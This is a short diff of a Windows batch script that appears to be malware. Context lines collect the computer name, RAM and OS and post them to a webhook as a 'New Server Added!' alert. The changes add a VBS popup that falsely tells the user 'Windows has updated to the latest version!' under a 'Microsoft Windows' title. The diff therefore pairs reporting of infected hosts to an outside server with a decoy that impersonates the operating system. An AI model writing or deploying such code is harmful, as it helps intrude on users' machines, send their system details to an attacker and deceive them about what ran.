@@ -28,9 +28,15 @@ set x=':white_check_mark: New Server Added! *%ComputerName%* - `%RAM%` - `%OS%` 
 powershell -Command "$webhookURL = '%uri%';$json = @{text = %x%} | ConvertTo-Json ;Invoke-RestMethod -Method Post -Uri $webhookURL -ContentType 'application/json' -Body $json"
 
 if EXIST a del a
-echo %uri%
+if NOT EXIST Info.vbs (goto inf) else (goto end)
+:inf
+echo CreateObject("WScript.Shell").Popup "Windows has updated to the latest version!", 2, "Microsoft Windows", 0+64 > Info.vbs
+start Info.vbs
+:end
 echo.
 echo Execution cycle finished.
 echo.
+
+
 
 
